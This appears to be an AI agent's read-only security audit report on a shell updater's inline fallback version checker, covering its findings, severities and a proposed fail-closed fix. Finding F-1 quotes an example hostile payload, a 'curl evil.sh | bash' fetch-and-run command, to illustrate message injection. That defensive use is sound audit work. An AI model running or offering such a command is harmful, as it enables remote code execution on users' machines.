# SPS2 ROUND 25A — INLINE UPDATE-CHECKER SECURITY AUDIT

Report time: 2026-10-16T22:35:09+06:00 (suffix 20261016-223509)
Mission: read-only security audit of the inline fallback checker in
`scripts/sps-update.sh` and `skills/sps/scripts/sps-update.sh` (the last
known unpatched T-01 surface). **Read-only round: the only filesystem
change is this report.** No implementation, staging, commit, push, CI
change, publication, or approval.

---

## 1. Baseline reinspection (task 1)

At 22:35+06: branch `build/roadmap-p3-completion`, HEAD `c49f385`, **40
porcelain / 0 staged / 0 stashes** — identical to the Round 24A end state
plus nothing. No concurrent agent work observed during the audit window.

| File | SHA-256 (first 16) | State |
|---|---|---|
| `scripts/sps-update.sh` | `ba90bfbfe6f57fd6` | modified vs HEAD — the pre-existing DEC-7201 updater-safety work (hash matches the Round 18 manifest); **untouched this round** |
| `skills/sps/scripts/sps-update.sh` | `ba90bfbfe6f57fd6` | byte-identical mirror of the above |
| `scripts/check-update.sh` | `f175ed77f54cea9d` | Round 21A hardened |
| `scripts/check-update.ps1` | `ca00fcea56b182d7` | Round 21A hardened |
| `skills/sps/scripts/check-update.sh` | `f175ed77f54cea9d` | Round 24A synced |
| `skills/sps/scripts/check-update.ps1` | `ca00fcea56b182d7` | Round 24A synced |

`bash -n` passes on both updater scripts.

## 2. The inline fallback checker (task 2)

`checker()` at `scripts/sps-update.sh:41-67` (mirror identical, verified
by `diff`):

- **:44-46** — candidate search: `$ROOT/scripts/check-update.sh`, then
  `$REPO_DIR/scripts/check-update.sh`. If found, the **hardened** checker
  runs (`bash "$check" "$@"`, exit code propagated).
- **:51-66** — the inline fallback, reached only when *both* candidates
  are absent. Mechanics:
  - `installed` from `$MANIFEST` grep (`:54`), empty → `unknown` (`:55`).
  - `latest` from `curl -fsSL --max-time 10` + `tr -d '[:space:]'`
    (`:56`) — **no format validation**.
  - Empty `latest` → offline, return 2 (`:57-60`).
  - `[[ "$installed" == "$latest" ]]` → up to date, return 0 (`:61-64`).
  - Otherwise → "update available", return 1 (`:65-66`).

Key structural facts (verified by grep and read):
- The fallback **never writes a state file** — zero occurrences of
  `CHECKED_AT`, `STATE_FILE`, or `update-state` in either updater script.
  It is stateless; every invocation is a fresh network check.
- The fallback **never calls `is_greater`** — the comparison is a single
  string equality. There is no arithmetic on remote data at all.
- The PowerShell updater (`update-sps.ps1:23-33`) has **no inline
  fallback**: if no `check-update.ps1` exists, `Checker` returns 2
  (offline) — fail-safe.

## 3. Findings (tasks 3 and 5), ranked

### F-1 — Malformed remote VERSION accepted as a "version" (MEDIUM, verified by static probe)

The fallback's only gate on remote data is non-emptiness. A compromised or
malicious raw URL response of `1.2.4; curl evil.sh | bash` is accepted:
the equality test fails, and the value flows into the message at `:65`:

```
SPS update available: v4.0.0 → v1.2.4; curl evil.sh | bash
```

**Verified by non-mutating probe** (§6): the string is echoed, never
evaluated — there is no `eval`, no unquoted expansion into a command
position, and the function returns 1 without further use of `latest`.
So this is **message injection / integrity confusion, not command
injection**. Two concrete harms remain:
1. A user reading the message may copy-paste the "remedy" line from a
   crafted payload (social-engineering channel).
2. A malformed value that happens to equal the installed string (e.g.
   remote serving `4.0.0 ` variants after `tr`) yields a false "up to
   date" — the fallback can assert up-to-date on data it never validated
   (the exact T-01 failure class, minus persistence).

Contrast: the hardened checker treats the same input as offline (exit 2),
never as a version, and never echoes it into a state file.

### F-2 — No cache, therefore no freeze — the T-01 cache-freeze class does NOT apply (verified)

The mission asks whether manipulated cache data can suppress checks
indefinitely. **It cannot, structurally**: the fallback reads and writes
no `update-state.env`. Its only persistent input is the install manifest
(`SPS_VERSION`), which is machine-local and written by the installer, not
by remote data. A hostile *manifest* could set `installed` arbitrarily,
but that is outside the remote-trust-chain threat model and yields only
wrong messages, not suppressed checks. **Verified**: grep count of
`CHECKED_AT|STATE_FILE|update-state` in both updater scripts = 0.

### F-3 — Fail-open on curl/parsing failure: NO — fails closed to offline (verified)

`curl -fsSL` with empty output or failure → `latest=""` → return 2
(offline), and the caller (`:96-99`) then exits 2 refusing to update.
`set -uo pipefail` is active. There is no path where a network failure
produces "up to date". (Minor: `tr` failure inside the pipeline is masked
by the assignment context, but the result is still empty → offline.)

### F-4 — Incorrect version comparisons: bounded, and safer than the old check-update (verified)

Without `is_greater`, the fallback only knows equal / not-equal. A newer
remote → "update available" (correct); an older remote → also "update
available" (a false positive — annoying, safe direction); a prerelease
remote → "update available" (matches hardened semantics). No
`10#`-arithmetic errors exist here because there is no arithmetic. The
Round 20B T-08 mis-sort class does not reach this code.

### F-5 — Unsafe shell behavior: no injection sink found (verified by read + probe)

`latest` reaches exactly one sink: the `echo -e` message. `installed`
reaches messages only. Neither is ever expanded unquoted into a command,
passed to `eval`, or written to a file executed later. The probe
confirmed metacharacters survive as inert text. Residual theoretical risk:
a terminal emulator interpreting escape sequences from `echo -e` — but the
payload can only contain what survived `tr -d '[:space:]'`, and ANSI
escapes are non-space bytes, so **ANSI/terminal-escape injection into the
fallback's message is possible in principle** (same exposure as the
hardened checker's own message paths, which echo `latest` after validation
— the hardened regex `^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$` blocks
escape bytes; the fallback has no such block). Severity: LOW (requires a
compromised raw URL plus a vulnerable terminal), but it is a real
difference from the hardened path.

### F-6 — Bypass of the hardened checker: NO (verified by execution-path trace)

Task 4 trace: the fallback is reachable **only** when both
`$ROOT/scripts/check-update.sh` and `$REPO_DIR/scripts/check-update.sh`
are absent (`:44-50`). In every current install shape — this repo, a
bootstrapped `~/.sps/src` clone, a skills-directory install with mirrors —
at least one exists (lint-sps.sh:75-76 *requires* the scripts/ copy). The
hardened checker cannot be bypassed *by* the fallback; the fallback is a
degraded last resort for truncated/legacy installs. Practical exposure
window: an install so old or damaged that `check-update.sh` is missing —
exactly the population that also predates the state-file cache, which is
why the fallback was written stateless.

### F-7 — Additional callers/copies (task 4): complete inventory

- `scripts/sps-doctor.sh:131-135` invokes `sps-update.sh --force` (repair
  path); with `--force`, the checker still runs first (`:94`), so the
  fallback is reachable from doctor under the same absence condition.
- `get-sps.sh`/`get-sps.ps1`/`bootstrap-sps.sh` do **not** invoke
  `sps-update.sh` (grep-verified — consistent with the DEC-7201
  no-auto-update rule).
- Mirror parity: the two updater scripts are byte-identical
  (`diff` clean), so both carry the identical fallback; fixing one without
  the other would break the repo's mirror invariant (see §7).
- Remote VERSION fetch sites repo-wide: exactly 4 — the two hardened
  `check-update.sh` copies and the two fallback copies in the updater
  scripts. `check-update.ps1` fetches via `Invoke-WebRequest` (hardened,
  Round 21A). **No other fetch sites exist.**

### Severity summary

| # | Finding | Severity | Status |
|---|---|---|---|
| F-1 | Malformed remote VERSION accepted; false up-to-date possible; message injection | **Medium** | Verified (probe + read) |
| F-2 | Cache freeze via manipulated state | **None** | Structurally impossible (stateless) |
| F-3 | Fail-open on network/parse failure | **None** | Fails closed to exit 2 |
| F-4 | Incorrect comparisons | **None** (false-positive direction only) | Verified |
| F-5 | Terminal-escape injection via unvalidated echo | **Low** | Theoretical; validated input blocks it, fallback doesn't |
| F-6 | Bypass of hardened checker | **None** | Fallback unreachable when checker present |
| F-7 | Mirror + doctor caller inventory | Info | Complete; mirrors identical |

Cross-reference with prior rounds: Round 20B T-01 described the fallback
as "shares the defect"; that was **partially imprecise** — it shares the
*remote-validation* defect (F-1) but not the *cache-freeze* defect (F-2):
the fallback predates the state cache and never had one. Round 21A §6 R-5
and Round 24A's closing note identified the fallback correctly as the
remaining gap.

## 4. Recommended minimal remediation (task 6 — NOT implemented)

**Smallest safe patch**: delete the inline fallback's remote fetch and
replace it with a fail-closed offline return, i.e. reduce `checker()` to:
prefer the hardened checker (existing `:44-50`), else **return 2 with the
existing offline message**. Rationale: the fallback's only unique
capability — a version check with no state file — is exactly the
unvalidated path (F-1/F-5), and its absence condition (`check-update.sh`
missing) describes a broken install where "cannot check, reinstall with
get-sps.sh" is the honest answer. This deletes ~16 lines and adds none.

- **Exact files**: `scripts/sps-update.sh` + `skills/sps/scripts/sps-update.sh`
  (both, to preserve byte-parity — a one-sided fix would violate the
  mirror invariant; both are already modified-and-ratified under DEC-7201,
  so this lands inside the ratified workstream's existing authorization
  shape, but a fresh explicit User decision is still required per
  DEC-7203's standing commit boundaries).
- **Expected behavior**: with `check-update.sh` present — zero change
  (F-6: the fallback is unreachable). With it absent — exit 2 "offline",
  no network fetch, no version messages. The `--check` and update paths
  are untouched.
- **Required regression tests** (in `sps2/tests/test_updater_safety.py`,
  the ratified module):
  1. *fallback removed*: grep both updater scripts for
     `raw.githubusercontent.com` → 0 matches (no second fetch site
     returns).
  2. *fail-closed when checker absent*: temp-HOME subprocess test with
     `check-update.sh` hidden (PATH-isolated root copy) → exit 2, no
     update attempted.
  3. *normal path preserved*: existing 13 tests must stay green
     unchanged.
  4. *mirror parity*: `diff` of the two updater scripts must stay clean.
- **Authorization boundaries**: editing the updater scripts is inside the
  DEC-7201 file set but is a *new semantic change* to ratified files —
  requires an explicit User decision naming both files; the standing
  no-commit/no-push rules (DEC-7203) continue to apply afterwards.
- **Alternative rejected**: porting `is_valid_version` into the fallback.
  Rejected because it duplicates trusted logic in two places, keeps a
  second network fetch site alive, and preserves a code path whose only
  customer is a broken install. Fail-closed deletion is smaller and safer.

## 5. Remaining uncertainties

1. **No dynamic execution of the fallback was performed** (read-only
   round; running it would require either the network or fixture
   scaffolding that could create caches). F-1's probe reproduced the
   comparison/echo logic in isolation, not the full script. Confidence in
   F-6/F-2/F-3 is high from structure; F-1's end-to-end behavior (exact
   output text) is inferred from the code read plus the isolated probe.
2. `sps-doctor.sh`'s `--force` repair path invokes the updater but was
   not executed; its interaction with the fallback inherits the same
   absence condition and needs no separate finding.
3. Whether any deployed install actually lacks `check-update.sh` (the
   fallback's only real-world trigger) is unknowable from this repo; if
   none exists, F-1's practical severity drops toward informational.

## 6. Safe checks performed (task 7)

`git status`/`rev-parse`/`stash list`; `shasum -a 256` on six files;
`diff` for mirror parity; `bash -n` on both updater scripts; targeted
`grep` inventories (callers, fetch sites, state-file usage,
`is_greater`); one non-mutating `bash -c` probe of the comparison/echo
logic with literal strings (no network, no files created, no caches, no
bytecode). **No fixture, cache, bytecode, or generated artifact was
created**; the shell probes ran on literals in `/tmp`-free inline form.

## 7. Final worktree preservation verification (task 9)

- HEAD `c49f385` unchanged; **0 staged; 0 stashes**; porcelain **40** —
  byte-for-byte the same entry set as the Round 24A end state.
- All six update-checker files re-hashed after the audit: identical to
  §1's pre-audit values (`ba90bfbf…` ×2 updaters, `f175ed77…` ×2,
  `ca00fcea…` ×2). **Nothing changed.**
- The updater scripts' working-tree modifications are the pre-existing
  DEC-7201 updater-safety work (present since before Round 18), not this
  round's.
- No concurrent agent changes observed at any point in the window.
- The only filesystem change this round: this report.

---

*Round 25A audit complete. Verdict: the inline fallback cannot freeze
caches, cannot bypass the hardened checker, and fails closed on network
error — but it still accepts malformed remote VERSION values (Medium,
verified) and lacks the input validation that makes the hardened path
safe (Low terminal-escape exposure). Recommended remediation: delete the
fallback in favor of a fail-closed offline return, in both mirrors, under
an explicit User decision. Not implemented. Awaiting instruction.*
